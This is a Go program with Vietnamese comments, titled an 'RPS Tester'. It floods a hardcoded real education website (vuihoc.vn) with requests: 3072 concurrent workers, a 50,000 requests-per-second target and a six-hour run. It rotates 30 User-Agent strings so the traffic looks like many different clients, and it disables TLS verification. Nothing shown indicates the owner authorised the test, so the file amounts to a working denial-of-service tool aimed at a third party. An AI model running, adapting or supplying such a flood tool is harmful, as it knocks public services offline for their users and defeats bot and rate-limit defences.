package main

import (
  "bytes"
  "context"
  "crypto/tls"
  "fmt"
  "io"
  "net"
  "net/http"
  "net/url"
  "runtime"
  "strings"
  "sync"
  "sync/atomic"
  "time"
)

// 30 User-Agent đa nền tảng được tối ưu
var userAgents = []string{
  // Windows - Chrome
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",

  // Windows - Firefox
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",

  // Windows - Edge
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",

  // Mac - Chrome
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",

  // Mac - Safari
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",

  // Linux
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

  // iPhone
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",

  // iPad
  "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",

  // Android - Samsung
  "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",

  // Android - Google Pixel
  "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",

  // Android - Xiaomi
  "Mozilla/5.0 (Linux; Android 14; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",

  // Android - OnePlus
  "Mozilla/5.0 (Linux; Android 14; 23128RA60G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; 23128RA60G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",

  // Android - Oppo
  "Mozilla/5.0 (Linux; Android 14; CPH2581) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",

  // Android - Vivo
  "Mozilla/5.0 (Linux; Android 14; V2318) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",

  // Android Tablet
  "Mozilla/5.0 (Linux; Android 14; SM-X810) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",

  // Windows Phone (hiếm)
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 Edge/40.15254.603",

  // Chrome OS
  "Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",

  // Legacy browsers
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",

  // Mobile - Generic
  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
}

type userAgentRotator struct {
  mu    sync.Mutex
  index int
}

func (r *userAgentRotator) getNext() string {
  r.mu.Lock()
  defer r.mu.Unlock()

  ua := userAgents[r.index]
  r.index = (r.index + 1) % len(userAgents)
  return ua
}

func main() {
  runtime.GOMAXPROCS(runtime.NumCPU())

  // ==== CONFIG NHÚNG ====
  target := "https://vuihoc.vn/tieu-hoc"
  method := "GET"
  concurrency := 3072
  duration := 21600 * time.Second
  rps := 50000
  http2 := true
  bodyStr := "" // nếu cần POST body thì để ở đây
  bodyFile := "" // không dùng file thì để rỗng
  timeout := 0 * time.Second
  warm := 200
  headers := []string{
    // ví dụ: "Authorization: Bearer XXX"
  }
  // ======================

  // Khởi tạo User-Agent rotator
  uaRotator := &userAgentRotator{}

  // Build request template
  u, err := url.Parse(target)
  if err != nil {
    panic(err)
  }

  var payload []byte
  if bodyFile != "" {
    // bỏ qua file reading cho đơn giản, chỉ dùng bodyStr
    payload = []byte(bodyStr)
  } else {
    payload = []byte(bodyStr)
  }
  hasBody := len(payload) > 0 && strings.ToUpper(method) != "GET" && strings.ToUpper(method) != "HEAD"

  // Transport tối ưu - GIỮ NGUYÊN LOGIC
  tr := &http.Transport{
    Proxy:                 http.ProxyFromEnvironment,
    DialContext:           (&net.Dialer{Timeout: 5 * time.Second, KeepAlive: 30 * time.Second}).DialContext,
    ForceAttemptHTTP2:     http2,
    MaxIdleConns:          1_000_000,
    MaxIdleConnsPerHost:   1_000_000,
    MaxConnsPerHost:       0,
    IdleConnTimeout:       90 * time.Second,
    ExpectContinueTimeout: 0,
    DisableCompression:    true,
    TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
  }
  client := &http.Client{
    Transport: tr,
    Timeout:   timeout,
  }

  // Prepare headers - GIỮ NGUYÊN LOGIC
  baseHeader := make(http.Header)
  for _, line := range headers {
    parts := strings.SplitN(line, ":", 2)
    if len(parts) == 2 {
      baseHeader.Add(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
    }
  }
  // Xóa User-Agent mặc định vì chúng ta sẽ xoay vòng
  baseHeader.Del("User-Agent")
  baseHeader.Del("Connection") // cho keep-alive

  // Warm-up - GIỮ NGUYÊN LOGIC
  if warm > 0 {
    var wg sync.WaitGroup
    warmReq, _ := http.NewRequest("HEAD", u.String(), nil)
    warmReq.Header = baseHeader.Clone()
    warmReq.Header.Set("User-Agent", userAgents[0]) // Dùng UA đầu tiên cho warm-up
    for i := 0; i < warm; i++ {
      wg.Add(1)
      go func() {
        defer wg.Done()
        resp, err := client.Do(warmReq)
        if err == nil {
          io.Copy(io.Discard, resp.Body)
          resp.Body.Close()
        }
      }()
    }
    wg.Wait()
  }

  var success, fail uint64
  var totalLatency int64

  if concurrency <= 0 {
    concurrency = 1
  }
  perWorkerRPS := float64(rps) / float64(concurrency)
  if perWorkerRPS < 1 {
    perWorkerRPS = 1
  }

  var bodyPool = sync.Pool{
    New: func() any { return bytes.NewBuffer(make([]byte, 0, len(payload))) },
  }

  ctx, cancel := context.WithTimeout(context.Background(), duration)
  defer cancel()

  worker := func() {
    interval := time.Duration(float64(time.Second) / perWorkerRPS)
    if interval <= 0 {
      interval = time.Microsecond
    }
    ticker := time.NewTicker(interval)
    defer ticker.Stop()

    for {
      select {
      case <-ctx.Done():
        return
      case <-ticker.C:
        var bodyReader io.Reader
        if hasBody {
          buf := bodyPool.Get().(*bytes.Buffer)
          buf.Reset()
          buf.Write(payload)
          bodyReader = bytes.NewReader(buf.Bytes())
          bodyPool.Put(buf)
        }
        req, _ := http.NewRequest(method, u.String(), bodyReader)
        req.Header = baseHeader.Clone()

        // THÊM USER-AGENT XOAY VÒNG - chỉ thay đổi duy nhất điểm này
        req.Header.Set("User-Agent", uaRotator.getNext())

        start := time.Now()
        resp, err := client.Do(req)
        lat := time.Since(start)

        if err != nil {
          atomic.AddUint64(&fail, 1)
          continue
        }

        if resp.Body != nil {
          io.Copy(io.Discard, resp.Body)
          resp.Body.Close()
        }

        if resp.StatusCode >= 200 && resp.StatusCode < 400 {
          atomic.AddUint64(&success, 1)
        } else {
          atomic.AddUint64(&fail, 1)
        }
        atomic.AddInt64(&totalLatency, int64(lat))
      }
    }
  }

  var wg sync.WaitGroup
  for i := 0; i < concurrency; i++ {
    wg.Add(1)
    go func() { defer wg.Done(); worker() }()
  }

  <-ctx.Done()
  wg.Wait()

  s := atomic.LoadUint64(&success)
  f := atomic.LoadUint64(&fail)
  total := s + f
  elapsed := duration.Seconds()
  rpsAchieved := float64(total) / elapsed
  var p50ms float64
  if total > 0 {
    avgLat := time.Duration(atomic.LoadInt64(&totalLatency) / int64(total))
    p50ms = float64(avgLat.Microseconds()) / 1000.0
  }

  fmt.Printf("\n=== RPS Tester Result ===\n")
  fmt.Printf("Target:        %s\n", target)
  fmt.Printf("Method:        %s  | Concurrency: %d  | Duration: %s\n", strings.ToUpper(method), concurrency, duration)
  fmt.Printf("HTTP/2:        %v\n", http2)
  fmt.Printf("Requested RPS: %d  | Achieved RPS: %.0f\n", rps, rpsAchieved)
  fmt.Printf("Success:       %d  | Fail: %d\n", s, f)
  if total > 0 {
    fmt.Printf("Avg latency:   ~%.2f ms (approx)\n", p50ms)
  }
  fmt.Printf("User-Agents:   %d rotating agents\n", len(userAgents))
}
